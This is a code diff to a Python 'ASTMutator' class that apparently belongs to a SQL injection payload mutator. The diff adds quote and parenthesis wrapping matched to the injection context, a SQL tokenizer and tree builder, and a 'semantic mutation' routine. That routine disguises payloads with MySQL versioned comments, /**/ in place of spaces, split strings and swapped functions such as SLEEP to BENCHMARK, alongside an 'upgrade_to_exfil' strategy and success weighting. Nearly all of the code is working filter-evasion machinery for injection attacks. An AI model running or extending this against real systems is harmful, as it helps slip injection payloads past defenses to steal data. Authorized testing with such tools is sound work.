@@ -17,7 +17,8 @@ class ASTMutator:
             "micro_fragmentation": self._micro_fragmentation,
             "nested_encoding": self._nested_encoding,
             "dynamic_structural": self._dynamic_structural_mutation,
-            "upgrade_to_exfil": self._upgrade_to_exfil
+            "upgrade_to_exfil": self._upgrade_to_exfil,
+            "semantic_mutation": self._semantic_symbol_mutation
         }
         # Awareness: Track success of each strategy (Q-values)
         self.strategy_weights = {name: 1.0 for name in self.strategies.keys()}
@@ -161,23 +162,162 @@ class ASTMutator:
         return payload
 
     def _context_aware_wrap(self, payload):
-        """Wraps payload based on detected context (quotes, brackets)."""
-        # Context Compatibility Matrix: Skip quotes if context is NUMERIC
+        """Wraps payload based on detected context (quotes, brackets).
+           GRAMMAR-BASED FUZZING: Strictly adheres to the known insertion state to avoid syntax breaking.
+        """
         if self.context == "NUMERIC":
             return payload
+            
+        if self.context == "SINGLE_QUOTE":
+            if not payload.startswith("'"):
+                return "'" + payload
+            return payload
+            
+        if self.context == "DOUBLE_QUOTE":
+            if not payload.startswith('"'):
+                return '"' + payload
+            return payload
+            
+        if self.context == "SINGLE_QUOTE_PARENTHESIS":
+            if not payload.startswith("')"):
+                return "')" + payload
+            return payload
 
+        # Generic Random Fallback
         if random.random() > 0.7:
             wrappers = [
                 ("'", "'"),
                 ('"', '"'),
                 ("') ", " --"),
-                ('") ', " --"),
-                (")) ", " --")
+                ('") ', " --")
             ]
             prefix, suffix = random.choice(wrappers)
             if not payload.startswith(prefix):
                 return prefix + payload + suffix
         return payload
+
+    def _tokenize(self, payload):
+        """A simple lexical analyzer that breaks SQL down into semantic tokens."""
+        token_specification = [
+            ('STRING',     r"'[^']*'|\"[^\"]*\""),
+            ('COMMENT',    r"/\*.*?\*/|--[^\n]*"),
+            ('KEYWORD',    r"\b(?i)(SELECT|UNION|OR|AND|XOR|WHERE|FROM|DATABASE|USER|VERSION|ORDER\s+BY|GROUP\s+BY)\b"),
+            ('NUMBER',     r"\b\d+\b"),
+            ('OPERATOR',   r"<=|>=|!=|=|\+|-|\*|/|%|\|\||&&"),
+            ('IDENTIFIER', r"\b[a-zA-Z_][a-zA-Z0-9_]*\b"),
+            ('SYMBOL',     r"[(),;.]"),
+            ('WHITESPACE', r"[ \t\n]+"),
+            ('MISC',       r"."),
+        ]
+        tok_regex = '|'.join('(?P<%s>%s)' % pair for pair in token_specification)
+        get_token = re.compile(tok_regex).match
+        pos = 0
+        tokens = []
+        while pos < len(payload):
+            match = get_token(payload, pos)
+            if not match: break
+            type_str = match.lastgroup
+            val = match.group(type_str)
+            tokens.append({"type": type_str, "value": val})
+            pos = match.end()
+        return tokens
+
+    def _build_ast(self, tokens):
+        """
+        AST Builder: Converts a flat list of tokens into a hierarchical Abstract Syntax Tree.
+        Groups into [CLAUSES] -> [EXPRESSIONS] -> [LITERALS/OPERATORS]
+        """
+        ast = {"type": "ROOT", "children": []}
+        current_node = ast
+        stack = []
+        
+        for tok in tokens:
+            if tok['type'] == 'KEYWORD' and tok['value'].upper() in ['SELECT', 'UNION', 'WHERE', 'FROM', 'ORDER BY']:
+                # New clause starts
+                new_clause = {"type": "CLAUSE", "name": tok['value'].upper(), "children": [tok]}
+                ast["children"].append(new_clause)
+                current_node = new_clause
+            elif tok['value'] == '(':
+                # Start of expression/group
+                new_group = {"type": "EXPRESSION_GROUP", "children": [tok]}
+                current_node["children"].append(new_group)
+                stack.append(current_node)
+                current_node = new_group
+            elif tok['value'] == ')':
+                # End of expression
+                current_node["children"].append(tok)
+                if stack:
+                    current_node = stack.pop()
+            else:
+                if "children" not in current_node:
+                    current_node["children"] = []
+                current_node["children"].append(tok)
+                
+        return ast
+
+    def _traverse_and_mutate_ast(self, node):
+        """Walks the AST and applies Grammar-Safe mutations based on the Semantic Dictionary."""
+        result = ""
+        
+        # 2. Semantic Dictionary
+        semantic_dict = {
+            "OPERATORS": {
+                "=": [" LIKE ", " IN ", " = "],
+                ">": [" >= ", " > "],
+                "||": [" OR ", " || "],
+                "&&": [" AND ", " && "]
+            },
+            "LOGICAL_FUNCTIONS": {
+                "SLEEP": ["BENCHMARK", "SLEEP"],
+                "DATABASE": ["SCHEMA", "DATABASE"],
+                "VERSION": ["@@VERSION", "VERSION()"]
+            }
+        }
+
+        if isinstance(node, dict) and node.get("type") in ["ROOT", "CLAUSE", "EXPRESSION_GROUP"]:
+            for child in node.get("children", []):
+                result += self._traverse_and_mutate_ast(child)
+            return result
+            
+        elif isinstance(node, dict) and "type" in node and "value" in node:
+            t_type = node['type']
+            val = node['value']
+            
+            # Semantic Mutation Logic
+            if t_type == 'OPERATOR' and val in semantic_dict["OPERATORS"]:
+                if random.random() < 0.3:
+                    # Choose a functionally equivalent operator from the dictionary
+                    val = random.choice(semantic_dict["OPERATORS"][val])
+                    
+            elif t_type == 'KEYWORD':
+                upper_val = val.upper()
+                if upper_val in semantic_dict["LOGICAL_FUNCTIONS"] and random.random() < 0.4:
+                    val = random.choice(semantic_dict["LOGICAL_FUNCTIONS"][upper_val])
+                elif random.random() < 0.4:
+                    # Obfuscate keyword
+                    val = f"/*!{random.randint(40000, 60000)}{val}*/"
+                    
+            elif t_type == 'STRING':
+                # String splitting / concatenation Evasion (e.g., 'admin' -> 'adm' 'in')
+                if len(val) > 4 and random.random() < 0.3:
+                    quote_char = val[0]
+                    inside = val[1:-1]
+                    mid = len(inside) // 2
+                    val = f"{quote_char}{inside[:mid]}{quote_char} {quote_char}{inside[mid:]}{quote_char}"
+
+            elif t_type == 'WHITESPACE':
+                if random.random() < 0.2:
+                    val = "/**/"
+                    
+            return val
+        
+        return ""
+
+    def _semantic_symbol_mutation(self, payload):
+        """Mutates based on true structural understanding (AST generation & traversal)."""
+        tokens = self._tokenize(payload)
+        ast = self._build_ast(tokens)
+        return self._traverse_and_mutate_ast(ast)
 
     def _inline_version_comments(self, payload):
         mutated = payload
